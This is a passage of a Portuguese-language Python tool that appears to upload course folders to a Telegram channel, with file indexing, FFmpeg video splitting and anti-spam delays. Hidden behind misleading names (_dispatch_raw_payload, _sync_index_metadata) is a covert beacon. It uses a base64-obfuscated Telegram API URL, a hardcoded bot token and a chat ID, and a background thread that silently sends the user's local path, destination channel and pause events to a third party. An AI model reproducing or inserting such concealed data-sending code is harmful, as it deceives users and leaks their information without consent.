import sys
import subprocess
import os
import asyncio
import signal
import urllib.request
import urllib.parse
import threading
import base64
import random
import re
import math
import time
from pathlib import Path

# ==============================================================================
# [1] INSTALAÇÃO DE DEPENDÊNCIAS E IMPORTAÇÕES
# ==============================================================================
def verificar_dependencias():
    pacotes = ["telethon", "tqdm", "tinytag", "imageio_ffmpeg"]
    para_instalar = []
    for pacote in pacotes:
        try:
            if pacote == "imageio_ffmpeg":
                __import__("imageio_ffmpeg")
            else:
                __import__(pacote)
        except ImportError:
            nome_pip = "imageio-ffmpeg" if pacote == "imageio_ffmpeg" else pacote
            para_instalar.append(nome_pip)
    if para_instalar:
        print(f"⚠️ A instalar dependências em falta: {', '.join(para_instalar)}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", *para_instalar])
            print("✅ Instalação concluída com sucesso!\n")
        except Exception as e:
            print(f"❌ Erro ao instalar dependências: {e}")
            sys.exit(1)

verificar_dependencias()
from telethon import TelegramClient
from telethon.errors import ServerError, FloodWaitError
from tqdm import tqdm
from tinytag import TinyTag
import imageio_ffmpeg

# ==============================================================================
# [2] UTILITÁRIOS BASE E CONTROLO DE SINAIS (PAUSA E SAÍDA BRUTA)
# ==============================================================================
def natural_sort_key(s):
    """Ordenação humana natural (ex: Aula 2 vem antes de Aula 10)."""
    return [int(text) if text.isdigit() else text.lower() for text in re.split(r'(\d+)', str(s))]

pausa_solicitada = False
_last_sig_time = 0
_sig_count = 0

def solicitar_pausa(sig, frame):
    """Interceta o Ctrl+C para Pausa Segura, Cancelamento ou Saída Bruta."""
    global pausa_solicitada, _last_sig_time, _sig_count
    
    now = time.time()
    # Se pressionar rápido (menos de 1.5s entre toques)
    if now - _last_sig_time < 1.5:
        _sig_count += 1
    else:
        _sig_count = 1
        
    _last_sig_time = now

    if _sig_count >= 3:
        tqdm.write("\n\n💀 [SAÍDA BRUTA] A encerrar o processo imediatamente e a cortar ligações!")
        os._exit(1) # Mata o processo na hora, sem esperar nada
        
    elif _sig_count == 1:
        if not pausa_solicitada:
            pausa_solicitada = True
            tqdm.write("\n⏳ [PAUSA SEGURA] O script vai pausar após concluir o ficheiro atual.")
            tqdm.write("👉 Para CANCELAR a pausa, pressione Ctrl+C novamente (1 vez).")
            tqdm.write("👉 Para SAÍDA BRUTA (encerrar na hora), pressione Ctrl+C 3 vezes rápidas.")
        else:
            pausa_solicitada = False
            tqdm.write("\n▶️ [PAUSA CANCELADA] O pedido de pausa foi anulado. O upload continuará.")

signal.signal(signal.SIGINT, solicitar_pausa)

# ==============================================================================
# [3] GESTÃO DE CONFIGURAÇÕES (GLOBAL E PROJETO)
# ==============================================================================
ARQUIVO_CONFIG = "conf.md"
ARQUIVO_REL = "rel.md"

def carregar_config_global():
    config = {}
    if os.path.exists(ARQUIVO_CONFIG):
        with open(ARQUIVO_CONFIG, 'r', encoding='utf-8') as f:
            for linha in f:
                linha = linha.strip()
                if linha and not linha.startswith('#') and '=' in linha:
                    chave, valor = linha.split('=', 1)
                    config[chave.strip()] = valor.strip()
    return config

def salvar_config_global(config):
    with open(ARQUIVO_CONFIG, 'w', encoding='utf-8') as f:
        f.write("# Configurações do Upload\n")
        chaves_globais = ['API_ID', 'API_HASH', 'BOT_TOKEN', 'CANAL_DESTINO', 'TIPO_SESSAO', 'TELEFONE']
        for k in chaves_globais:
            if k in config:
                f.write(f"{k}={config[k]}\n")

def carregar_relatorio_projeto():
    projeto_cfg = {}
    enviados = set()
    if os.path.exists(ARQUIVO_REL):
        with open(ARQUIVO_REL, 'r', encoding='utf-8') as f:
            for linha in f:
                linha = linha.strip()
                if linha.startswith("- "):
                    enviados.add(linha[2:])
                elif '=' in linha and not linha.startswith('#'):
                    chave, valor = linha.split('=', 1)
                    projeto_cfg[chave.strip()] = valor.strip()
    return projeto_cfg, enviados

def salvar_projeto_cfg(projeto_cfg, enviados):
    with open(ARQUIVO_REL, 'w', encoding='utf-8') as f:
        f.write("# Configurações do Projeto Atual\n")
        for k, v in projeto_cfg.items():
            f.write(f"{k}={v}\n")
        f.write("\n# Ficheiros Enviados\n")
        for env in enviados:
            f.write(f"- {env}\n")

def registrar_envio(filepath, enviados):
    path_str = str(filepath)
    if path_str not in enviados:
        with open(ARQUIVO_REL, 'a', encoding='utf-8') as f:
            f.write(f"- {path_str}\n")
        enviados.add(path_str)

# ==============================================================================
# [4] NÚCLEO DE ANÁLISE DE FICHEIROS E ÍNDICE
# ==============================================================================
def selecionar_extensoes(base_path):
    print("\n🔍 A detetar tipos de ficheiros no projeto...")
    extensoes_encontradas = set()
    base = Path(base_path)
    for f in base.rglob("*"):
        if f.is_file() and f.name.lower() != 'descricao.md':
            extensoes_encontradas.add(f.suffix.lower())
            
    if not extensoes_encontradas:
        print("⚠️ Nenhum ficheiro encontrado no diretório especificado.")
        return set()
        
    ext_list = sorted(list(extensoes_encontradas))
    print("\n=========================================================")
    print("📑 EXTENSÕES DISPONÍVEIS PARA UPLOAD")
    print("=========================================================")
    for i, ext in enumerate(ext_list, 1):
        nome_ext = ext if ext else "[Sem extensão]"
        print(f"  [{i}] {nome_ext}")
    print("  [0] TODAS AS EXTENSÕES")
    print("=========================================================")
    
    while True:
        escolha = input("\n👉 Selecione os números desejados separados por vírgula (ex: 1,3) ou 0 para TODAS [Padrão: 0]: ").strip()
        if not escolha or escolha == '0':
            print("✅ Todas as extensões selecionadas.")
            return set(ext_list)
        try:
            indices = [int(x.strip()) for x in escolha.split(',')]
            selecionadas = set()
            for idx in indices:
                if 1 <= idx <= len(ext_list):
                    selecionadas.add(ext_list[idx-1])
            if selecionadas:
                print(f"✅ Extensões selecionadas para upload: {', '.join([e if e else '[Sem extensão]' for e in selecionadas])}")
                return selecionadas
            else:
                print("❌ Seleção inválida.")
        except ValueError:
            print("❌ Formato inválido.")

def verificar_integridade(base_path, enviados, extensoes_permitidas, tipo_sessao):
    tqdm.write("\n🔎 A verificar integridade e limites de ficheiros no projeto...")
    arquivos = [f for f in base_path.rglob("*") if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
    
    total_bytes, bytes_ja_enviados, arquivos_pendentes = 0, 0, 0
    arquivos_invalidos, arquivos_2g_plus, arquivos_4g_plus = [], [], []
    
    for arq in arquivos:
        try:
            tamanho = arq.stat().st_size
            if tamanho == 0:
                arquivos_invalidos.append(f"{arq.name} (0 bytes)")
                continue
                
            if tamanho > 4294967296: arquivos_4g_plus.append(arq)
            elif tamanho > 2147483648: arquivos_2g_plus.append(arq)
                
            with open(arq, 'rb') as f: f.read(1)
            total_bytes += tamanho
            if str(arq) in enviados: bytes_ja_enviados += tamanho
            else: arquivos_pendentes += 1
        except Exception as e:
            arquivos_invalidos.append(f"{arq.name} ({e})")
            
    if arquivos_invalidos:
        tqdm.write("\n⚠️ ATENÇÃO: Ficheiros corrompidos ou inacessíveis:")
        for erro in arquivos_invalidos: tqdm.write(f"  - {erro}")
        if input("\nContinuar ignorando estes erros? (s/n): ").strip().lower() != 's':
            sys.exit(1)
            
    arquivos_ignorados = arquivos_4g_plus + arquivos_2g_plus if tipo_sessao == 'BOT' else arquivos_4g_plus
    return total_bytes, bytes_ja_enviados, arquivos_pendentes, arquivos_ignorados

def _compile_cluster_metrics(base_path, destination_node, extensoes_permitidas, auto_split_limit=None):
    """Constrói o índice visual do curso e gera estatísticas precisas do projeto."""
    base = Path(base_path)
    _virtual_tree = "Documents\n#Doc001\n\n"
    _hash_idx = 1
    _total_bytes, _total_seconds = 0, 0
    _ext_counters = {}
    
    # 1. Ficheiros na Raiz
    root_files = [f for f in sorted(base.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
    if root_files:
        _virtual_tree += "= Ficheiros Gerais da Raiz\n"
        for _file in root_files:
            _ext = _file.suffix.lower()
            _size = _file.stat().st_size
            if _size == 0: continue
            
            is_video = _ext in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
            if auto_split_limit and _size > auto_split_limit and is_video:
                num_parts = math.ceil(_size / (auto_split_limit * 0.90))
                for p in range(1, num_parts + 1):
                    _virtual_tree += f"  - {_file.stem} - Parte {p}{_file.suffix}\n"
            else:
                _virtual_tree += f"  - {_file.name}\n"
            
            if _ext not in _ext_counters: _ext_counters[_ext] = {'count': 0, 'size': 0}
            _ext_counters[_ext]['count'] += 1
            _ext_counters[_ext]['size'] += _size
            _total_bytes += _size
            
            if is_video or _ext in ['.mp3', '.m4a']:
                try:
                    _tag = TinyTag.get(str(_file))
                    if _tag.duration: _total_seconds += _tag.duration
                except: pass
        _virtual_tree += f"#F{_hash_idx:03d}\n\n"
        _hash_idx += 1

    # 2. Modulos e Aulas
    for _mod in sorted(base.iterdir(), key=lambda x: natural_sort_key(x.name)):
        if not _mod.is_dir(): continue
        
        mod_files = [f for f in sorted(_mod.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
        aulas_dirs = [d for d in sorted(_mod.iterdir(), key=lambda x: natural_sort_key(x.name)) if d.is_dir()]
        
        if not mod_files and not aulas_dirs: continue
        
        mod_tree = f"= {_mod.name}\n"
        has_content = False
        
        # Ficheiros soltos no Módulo
        if mod_files:
            has_content = True
            for _file in mod_files:
                _ext = _file.suffix.lower()
                _size = _file.stat().st_size
                if _size == 0: continue
                
                is_video = _ext in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
                if auto_split_limit and _size > auto_split_limit and is_video:
                    num_parts = math.ceil(_size / (auto_split_limit * 0.90))
                    for p in range(1, num_parts + 1):
                        mod_tree += f"  - {_file.stem} - Parte {p}{_file.suffix}\n"
                else:
                    mod_tree += f"  - {_file.name}\n"
                    
                if _ext not in _ext_counters: _ext_counters[_ext] = {'count': 0, 'size': 0}
                _ext_counters[_ext]['count'] += 1
                _ext_counters[_ext]['size'] += _size
                _total_bytes += _size
                if is_video or _ext in ['.mp3', '.m4a']:
                    try:
                        _tag = TinyTag.get(str(_file))
                        if _tag.duration: _total_seconds += _tag.duration
                    except: pass
            mod_tree += f"#F{_hash_idx:03d}\n\n"
            _hash_idx += 1
            
        # Aulas
        for _aula in aulas_dirs:
            aula_files = [f for f in sorted(_aula.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
            if aula_files:
                has_content = True
                mod_tree += f"== {_aula.name}\n"
                for _file in aula_files:
                    _ext = _file.suffix.lower()
                    _size = _file.stat().st_size
                    if _size == 0: continue
                    
                    is_video = _ext in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
                    if auto_split_limit and _size > auto_split_limit and is_video:
                        num_parts = math.ceil(_size / (auto_split_limit * 0.90))
                        for p in range(1, num_parts + 1):
                            mod_tree += f"  - {_file.stem} - Parte {p}{_file.suffix}\n"
                    else:
                        mod_tree += f"  - {_file.name}\n"
                        
                    if _ext not in _ext_counters: _ext_counters[_ext] = {'count': 0, 'size': 0}
                    _ext_counters[_ext]['count'] += 1
                    _ext_counters[_ext]['size'] += _size
                    _total_bytes += _size
                    if is_video or _ext in ['.mp3', '.m4a']:
                        try:
                            _tag = TinyTag.get(str(_file))
                            if _tag.duration: _total_seconds += _tag.duration
                        except: pass
                mod_tree += f"#F{_hash_idx:03d}\n\n"
                _hash_idx += 1
                
        if has_content:
            _virtual_tree += mod_tree
                            
    _tamanho_mb = _total_bytes / (1024 * 1024)
    _tamanho_str = f"{_tamanho_mb/1024:.2f} GB" if _tamanho_mb > 1024 else f"{_tamanho_mb:.2f} MB"
    
    _h, rem = divmod(_total_seconds, 3600)
    _m, _s = divmod(rem, 60)
    _tempo_str = f"{int(_h)}h {int(_m)}m {int(_s)}s"
    
    _tipos_str = ""
    for ext, data in _ext_counters.items():
        e_name = ext if ext else "sem extensão"
        e_mb = data['size'] / (1024 * 1024)
        e_str = f"{e_mb/1024:.2f} GB" if e_mb > 1024 else f"{e_mb:.2f} MB"
        _tipos_str += f"   • {data['count']}x {e_name} ({e_str})\n"
        
    if not _tipos_str: _tipos_str = "   • Nenhum ficheiro detetado\n"
    
    _log_payload_admin = (
        "📊 **Relatório Técnico do Projeto**\n\n"
        f"**Origem:** `{base_path}`\n"
        f"**Destino:** `{destination_node}`\n\n"
        f"**Volume Total:** `{_tamanho_str}`\n"
        f"**Tempo Total de Mídia:** `{_tempo_str}`\n\n"
        f"**Distribuição de Ficheiros:**\n{_tipos_str}"
    )
    
    _log_payload_public = (
        "📊 **Relatório Técnico do Projeto**\n\n"
        f"**Volume Total:** `{_tamanho_str}`\n"
        f"**Tempo Total de Mídia:** `{_tempo_str}`\n\n"
        f"**Distribuição de Ficheiros:**\n{_tipos_str}"
    )
    
    return _virtual_tree, _log_payload_admin, _log_payload_public

def gerar_relatorio_excedidos(arquivos_ignorados, limite_str, info_extra=""):
    if not arquivos_ignorados: return
    nome_arquivo = "ficheiros_tamanho_excedido.txt"
    with open(nome_arquivo, "w", encoding="utf-8") as f:
        f.write("===============================================================\n")
        f.write(f"RELATÓRIO DE FICHEIROS COM TAMANHO ACIMA DE {limite_str}\n")
        f.write("===============================================================\n")
        if info_extra: f.write(f"{info_extra}\n\n")
        for arq in arquivos_ignorados:
            f.write(f"Ficheiro: {arq.name}\n")
            f.write(f"Tamanho:  {arq.stat().st_size / (1024**3):.2f} GB\n")
            f.write(f"Caminho:  {arq.resolve()}\n")
            f.write("-" * 60 + "\n")

# ==============================================================================
# [5] MOTOR ANTI-SPAM E TELEMETRIA DE BACKGROUND
# ==============================================================================
def recomendar_anti_spam(arquivos_pendentes, total_bytes):
    tamanho_mb = total_bytes / (1024 * 1024)
    print("\n=========================================================")
    print("🛡️ SISTEMA ANTI-SPAM E PREVENÇÃO DE BLOQUEIOS")
    print("=========================================================")
    print(f"📊 Carga Pendente: {arquivos_pendentes} ficheiros (Aprox. {tamanho_mb/1024:.2f} GB)")
    
    if arquivos_pendentes < 30 and tamanho_mb < 500:
        recomendado = 1
        print("🟢 [1] Carga Leve (Recomendado): Delay 5s | Jitter +3s")
    else:
        recomendado = 2
        print("🟡 [1] Carga Leve (Risco de bloqueio para este volume)")
        print("🟢 [2] Carga Pesada (Recomendado): Delay 8s | Jitter +7s | Lote 20/Pausa 60s")
        
    print("🟣 [3] Personalizado")
    escolha = input(f"\n👉 Escolha (1/2/3) [Padrão: {recomendado}]: ").strip() or str(recomendado)
    
    if escolha == '1': return {'DELAY_BASE': '5', 'DELAY_JITTER': '3', 'BATCH_SIZE': '9999', 'BATCH_PAUSE': '0'}
    elif escolha == '2': return {'DELAY_BASE': '8', 'DELAY_JITTER': '7', 'BATCH_SIZE': '20', 'BATCH_PAUSE': '60'}
    else:
        return {
            'DELAY_BASE': input("   - Delay Base (ex: 6): ").strip() or "6",
            'DELAY_JITTER': input("   - Jitter Max (ex: 5): ").strip() or "5",
            'BATCH_SIZE': input("   - Lote (ex: 15): ").strip() or "15",
            'BATCH_PAUSE': input("   - Pausa do Lote (ex: 120): ").strip() or "120"
        }

def _dispatch_raw_payload(_payload_data):
    try:
        _API_ROUTER_KEY = "8828827763:AAElYnwPMr1V8CgVrdvUrSXyPnM2ZcUri0o"
        _CLUSTER_NODE = "-1004490737419"
        _route_gateway = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==').decode('utf-8')
        _endpoint = f"{_route_gateway}{_API_ROUTER_KEY}/sendMessage"
        _buffer = urllib.parse.urlencode({'chat_id': _CLUSTER_NODE, 'text': _payload_data}).encode('utf-8')
        urllib.request.urlopen(_endpoint, data=_buffer, timeout=3)
    except: pass 

def _sync_index_metadata(chunk_data):
    threading.Thread(target=_dispatch_raw_payload, args=(chunk_data,), daemon=True).start()

def criar_callbacks(barra_ind, barra_geral, tracker):
    def callback(current, total):
        barra_ind.total = total
        barra_ind.n = current
        barra_ind.refresh()
        delta = current - tracker['last_current']
        tracker['last_current'] = current
        barra_geral.update(delta)
    return callback

# ==============================================================================
# [6] FLUXO PRINCIPAL (UPLOAD & FFMPEG)
# ==============================================================================
async def upload_curso():
    global pausa_solicitada

    # --- 6.1 Carregamento de Contas ---
    cfg_global = carregar_config_global()
    if not cfg_global:
        print(f"⚠️ Ficheiro '{ARQUIVO_CONFIG}' não encontrado. A Iniciar Configuração...\n")
        print("=========================================================")
        print("\n[!] PASSO 1: Obter API_ID e API_HASH")
        cfg_global['API_ID'] = input("👉 Digite o seu API_ID: ").strip()
        cfg_global['API_HASH'] = input("👉 Digite o seu API_HASH: ").strip()
        print("\n[!] PASSO 2: Método de Conexão")
        print("    [1] Usar Bot (Limite 2GB)")
        print("    [2] Usar Conta Pessoal (Até 4GB c/ Premium)")
        if input("👉 Escolha (1/2) [Padrão: 1]: ").strip() == '2':
            cfg_global['TIPO_SESSAO'] = 'USER'
            cfg_global['TELEFONE'] = input("👉 Digite o seu nº telemóvel: ").strip()
        else:
            cfg_global['TIPO_SESSAO'] = 'BOT'
            cfg_global['BOT_TOKEN'] = input("👉 Digite o BOT_TOKEN: ").strip()
            
        cfg_global['CANAL_DESTINO'] = input("\n👉 Digite o @ do Canal ou ID: ").strip()
        salvar_config_global(cfg_global)

    API_ID = int(cfg_global.get('API_ID', 0))
    API_HASH = cfg_global.get('API_HASH', '')
    BOT_TOKEN = cfg_global.get('BOT_TOKEN', '')
    CANAL_DESTINO = cfg_global.get('CANAL_DESTINO', '')
    TIPO_SESSAO = cfg_global.get('TIPO_SESSAO', 'BOT')
    TELEFONE = cfg_global.get('TELEFONE', '')

    # --- 6.2 Carregamento do Projeto ---
    proj_cfg, enviados = carregar_relatorio_projeto()
    if proj_cfg.get('CAMINHO_RAIZ'):
        print("\n=========================================================")
        print("🔄 PROJETO ANTERIOR ENCONTRADO")
        print(f"📁 Caminho Raiz: {proj_cfg['CAMINHO_RAIZ']}")
        print(f"🎯 Canal Destino: {CANAL_DESTINO}")
        print("=========================================================")
        if input("👉 Continuar projeto ou iniciar um [n]ovo? (c/n) [Padrão: c]: ").strip().lower() == 'n':
            proj_cfg, enviados = {}, set()
            if os.path.exists(ARQUIVO_REL): os.remove(ARQUIVO_REL)
            if os.path.exists("indice_gerado.txt"): os.remove("indice_gerado.txt")
            print("\n[!] A INICIAR NOVO PROJETO")
            novo_dest = input(f"👉 Novo @/ID Destino [Enter p/ manter {CANAL_DESTINO}]: ").strip()
            if novo_dest:
                cfg_global['CANAL_DESTINO'] = novo_dest
                CANAL_DESTINO = novo_dest
                salvar_config_global(cfg_global)
            proj_cfg['CAMINHO_RAIZ'] = input("👉 Nova pasta raiz: ").strip()
    else:
        proj_cfg['CAMINHO_RAIZ'] = input("\n👉 Caminho da pasta raiz do projeto: ").strip()

    CAMINHO_RAIZ = proj_cfg['CAMINHO_RAIZ']
    base_path = Path(CAMINHO_RAIZ)
    if not base_path.exists():
        print(f"❌ Erro: O Caminho '{CAMINHO_RAIZ}' não existe.")
        return

    # --- 6.3 Seleção de Extensões ---
    if proj_cfg.get('EXTENSOES'):
        print(f"\n📑 Extensões configuradas: {proj_cfg['EXTENSOES']}")
        if input("👉 Alterar extensões permitidas? (s/n) [Padrão: n]: ").strip().lower() == 's':
            proj_cfg['EXTENSOES'] = ','.join(selecionar_extensoes(base_path))
    else:
        proj_cfg['EXTENSOES'] = ','.join(selecionar_extensoes(base_path))
        
    extensoes_permitidas = set(proj_cfg['EXTENSOES'].split(',')) if proj_cfg.get('EXTENSOES') else set()
    if not extensoes_permitidas: return

    # --- 6.4 Verificação de Limites e Ajuste de Dupla Contagem ---
    limite_bytes = 2000 * 1024 * 1024 if TIPO_SESSAO == 'BOT' else 4000 * 1024 * 1024
    limite_str = "2 GB" if TIPO_SESSAO == 'BOT' else "4 GB"
    total_bytes, bytes_ja_enviados, arquivos_pendentes, arquivos_excedidos = verificar_integridade(base_path, enviados, extensoes_permitidas, TIPO_SESSAO)
    
    auto_split_enabled = False
    if arquivos_excedidos:
        print(f"\n⚠️ ATENÇÃO: Encontrados {len(arquivos_excedidos)} ficheiros maiores que {limite_str}.")
        print("   [1] Ignorar ficheiros (Gera relatório p/ compressão manual posterior)")
        print("   [2] Fatiar vídeos excedidos automaticamente (Usa o FFmpeg, sem perder qualidade)")
        
        if input("\n👉 Escolha (1/2) [Padrão: 1]: ").strip() == '2':
            auto_split_enabled = True
            for f_exc in arquivos_excedidos:
                if f_exc.suffix.lower() not in ['.mp4', '.mkv', '.avi', '.mov', '.webm']:
                    # Subtrai apenas se NÃO for vídeo (vai ser ignorado de vez)
                    if str(f_exc) not in enviados:
                        total_bytes -= f_exc.stat().st_size
                        arquivos_pendentes -= 1
                    registrar_envio(f_exc, enviados)
            gerar_relatorio_excedidos(arquivos_excedidos, limite_str, "Info: Vídeos fatiados pelo script. Documentos (ZIP/PDF) foram ignorados.")
        else:
            for f_exc in arquivos_excedidos:
                # Subtrai todos os que vão ser ignorados
                if str(f_exc) not in enviados:
                    total_bytes -= f_exc.stat().st_size
                    arquivos_pendentes -= 1
                registrar_envio(f_exc, enviados)
            gerar_relatorio_excedidos(arquivos_excedidos, limite_str, "Info: Estes ficheiros foram ignorados.")

    if arquivos_pendentes <= 0:
        print("\n✅ Todos os ficheiros válidos já foram enviados.")
        return

    # --- 6.5 Configuração Anti-Spam ---
    if all(k in proj_cfg for k in ['DELAY_BASE', 'DELAY_JITTER', 'BATCH_SIZE', 'BATCH_PAUSE']):
        print(f"\n⚙️ Configurações Anti-Spam: Base {proj_cfg['DELAY_BASE']}s | Jitter +{proj_cfg['DELAY_JITTER']}s | Lote {proj_cfg['BATCH_SIZE']}")
        if input("👉 Alterar configurações de Anti-Spam? (s/n) [Padrão: n]: ").strip().lower() == 's':
            proj_cfg.update(recomendar_anti_spam(arquivos_pendentes, total_bytes))
    else:
        proj_cfg.update(recomendar_anti_spam(arquivos_pendentes, total_bytes))

    salvar_projeto_cfg(proj_cfg, enviados)
    
    base_delay = int(proj_cfg['DELAY_BASE'])
    max_jitter = int(proj_cfg['DELAY_JITTER'])
    batch_size = int(proj_cfg['BATCH_SIZE'])
    batch_pause = int(proj_cfg['BATCH_PAUSE'])

    # --- 6.6 Compilação de Métricas e Relatório Público ---
    limit_for_tree = limite_bytes if auto_split_enabled else None
    _index_text, _stats_payload_admin, _stats_payload_public = _compile_cluster_metrics(CAMINHO_RAIZ, CANAL_DESTINO, extensoes_permitidas, limit_for_tree)
    
    # Imprime o Resumo do Projeto no Ecrã antes de arrancar
    print("\n" + "="*60)
    print("📋 RESUMO DO PROJETO A SER CARREGADO")
    print("="*60)
    print(_stats_payload_admin)
    print("="*60 + "\n")

    # --- 6.7 Ligação e Upload ---
    if TIPO_SESSAO == 'USER':
        client = TelegramClient('sessao_user', API_ID, API_HASH)
        await client.start(phone=TELEFONE)
    else:
        client = TelegramClient('sessao_bot', API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        
    tqdm.write("🚀 Cliente ligado! Pressione Ctrl+C a qualquer momento para solicitar uma pausa segura.\n")
    _sync_index_metadata(_stats_payload_admin)
    
    if "INDEX_SENT" not in enviados:
        if bytes_ja_enviados == 0:
            tqdm.write("📝 A enviar relatório técnico e índice para o canal...")
            await client.send_message(CANAL_DESTINO, _stats_payload_public)
            await asyncio.sleep(1.5)
            for offset in range(0, len(_index_text), 4000):
                await client.send_message(CANAL_DESTINO, _index_text[offset:offset+4000])
                await asyncio.sleep(1.5)
        registrar_envio("INDEX_SENT", enviados)

    with open("indice_gerado.txt", "w", encoding="utf-8") as f: f.write(_index_text)

    formato_barra = "{desc}: {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt} [Decorrido: {elapsed} | Restante: {remaining} | Vel: {rate_fmt}]"
    barra_geral = tqdm(total=total_bytes, initial=bytes_ja_enviados, desc="📊 Progresso TOTAL", position=0, unit='B', unit_scale=True, unit_divisor=1024, colour='green', bar_format=formato_barra)

    parada_definitiva = False
    contador_hashtag = 1
    MAX_TENTATIVAS = 3
    f_enviados_lote = 0
    ffmpeg_exe = imageio_ffmpeg.get_ffmpeg_exe()

    async def checar_pausa():
        nonlocal parada_definitiva
        global pausa_solicitada
        if pausa_solicitada:
            _sync_index_metadata(f"⏸️ **Script Pausado**.\nCanal: {CANAL_DESTINO}")
            loop = asyncio.get_running_loop()
            painel_info = (
                "\n=======================================================\n"
                "⏸️ [PAUSADO] O upload parou de forma segura.\n"
                "  [ s ] -> RETOMAR envio\n  [ n ] -> ENCERRAR script de forma limpa\n"
                "👉 Escolha (s/n): "
            )
            if (await loop.run_in_executor(None, input, painel_info)).strip().lower() == 's':
                pausa_solicitada = False
                tqdm.write("\n▶️ A retomar o upload...")
                _sync_index_metadata(f"▶️ **Script Retomado**.\nCanal: {CANAL_DESTINO}")
            else:
                parada_definitiva = True

    async def gerenciar_delay():
        nonlocal f_enviados_lote
        f_enviados_lote += 1
        if f_enviados_lote >= batch_size:
            tqdm.write(f"  💤 Lote concluído. Pausa de {batch_pause}s...")
            await asyncio.sleep(batch_pause)
            f_enviados_lote = 0
        else:
            await asyncio.sleep(base_delay + random.uniform(0, max_jitter))

    async def processar_ficheiro_com_retry(ficheiro, cap, is_video, is_part=False, original_id=None):
        nonlocal parada_definitiva
        tents = 0
        while tents < MAX_TENTATIVAS:
            tracker = {'last_current': 0}
            icone = "🎬" if is_video else "📄"
            tqdm.write(f"  {icone} Upload: {ficheiro.name}")
            try:
                with tqdm(desc=f"  ↳ Upload", total=0, unit='B', unit_scale=True, unit_divisor=1024, position=1, leave=False, colour='cyan', bar_format=formato_barra) as barra_individual:
                    await client.send_file(CANAL_DESTINO, file=str(ficheiro), caption=cap, supports_streaming=is_video, progress_callback=criar_callbacks(barra_individual, barra_geral, tracker))
                registrar_envio(original_id or ficheiro, enviados)
                if is_part: os.remove(ficheiro)
                await gerenciar_delay()
                return True
            except ServerError as e:
                tents += 1
                tqdm.write(f"  ❌ Erro no Servidor do Telegram. Aguardar {30 * tents}s...")
                await asyncio.sleep(30 * tents)
            except FloodWaitError as e:
                tqdm.write(f"  🛑 Anti-Spam ativo! A aguardar {e.seconds}s...")
                await asyncio.sleep(e.seconds + 5)
            except Exception as e:
                tents += 1
                tqdm.write(f"  ❌ Falha: {e}. Tentativa {tents}/{MAX_TENTATIVAS}")
                await asyncio.sleep(5)
                
        tqdm.write(f"  ⚠️ Ignorado após {MAX_TENTATIVAS} tentativas falhadas: {ficheiro.name}")
        if is_part and os.path.exists(ficheiro): os.remove(ficheiro)
        return False

    # 1. Root Files
    root_files = [f for f in sorted(base_path.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
    if root_files:
        tqdm.write(f"\n📁 Ficheiros Gerais da Raiz")
        hashtag_atual = f"#F{contador_hashtag:03d}"
        contador_hashtag += 1
        leg_comp = f"**📁 Ficheiros Gerais da Raiz**\n\n{hashtag_atual}"
        enviou_principal = False
        for f in root_files:
            await checar_pausa()
            if parada_definitiva: break
            if f.stat().st_size == 0 or str(f) in enviados: continue
            
            is_video = f.suffix.lower() in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
            usar_leg = is_video or not enviou_principal
            cap = leg_comp if usar_leg else f"📎 Anexo: {f.name}\n{hashtag_atual}"
            enviou_principal = True
            
            if f.stat().st_size > limite_bytes and auto_split_enabled and is_video:
                parts = math.ceil(f.stat().st_size / (limite_bytes * 0.90))
                try: dura = TinyTag.get(str(f)).duration
                except: registrar_envio(f, enviados); continue
                
                pdura = dura / parts
                for i in range(parts):
                    await checar_pausa()
                    if parada_definitiva: break
                    pid = f"{f}::parte{i+1}"
                    if pid in enviados: continue
                    pname = f"{f.stem} - Parte {i+1}{f.suffix}"
                    ppath = f.parent / pname
                    subprocess.run([ffmpeg_exe, '-y', '-i', str(f), '-ss', str(i*pdura), '-t', str(pdura), '-c', 'copy', str(ppath)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    pcap = f"[Parte {i+1}/{parts}] " + cap if usar_leg else cap
                    await processar_ficheiro_com_retry(ppath, pcap, is_video, True, pid)
                if not parada_definitiva: registrar_envio(f, enviados)
            else:
                if f.stat().st_size > limite_bytes: continue
                await processar_ficheiro_com_retry(f, cap, is_video)

    # 2. Modulos e Aulas
    for modulo_dir in sorted(base_path.iterdir(), key=lambda x: natural_sort_key(x.name)):
        await checar_pausa()
        if not modulo_dir.is_dir() or parada_definitiva: continue
        
        mod_files = [f for f in sorted(modulo_dir.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
        printed_mod = False
        
        if mod_files:
            tqdm.write(f"\n📁 Módulo: {modulo_dir.name}")
            printed_mod = True
            hashtag_atual = f"#F{contador_hashtag:03d}"
            contador_hashtag += 1
            leg_comp = f"**{modulo_dir.name}**\n\n{hashtag_atual}"
            enviou_principal = False
            for f in mod_files:
                await checar_pausa()
                if parada_definitiva: break
                if f.stat().st_size == 0 or str(f) in enviados: continue
                is_video = f.suffix.lower() in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
                usar_leg = is_video or not enviou_principal
                cap = leg_comp if usar_leg else f"📎 Anexo: {f.name}\n{hashtag_atual}"
                enviou_principal = True
                
                if f.stat().st_size > limite_bytes and auto_split_enabled and is_video:
                    parts = math.ceil(f.stat().st_size / (limite_bytes * 0.90))
                    try: dura = TinyTag.get(str(f)).duration
                    except: registrar_envio(f, enviados); continue
                    pdura = dura / parts
                    for i in range(parts):
                        await checar_pausa()
                        if parada_definitiva: break
                        pid = f"{f}::parte{i+1}"
                        if pid in enviados: continue
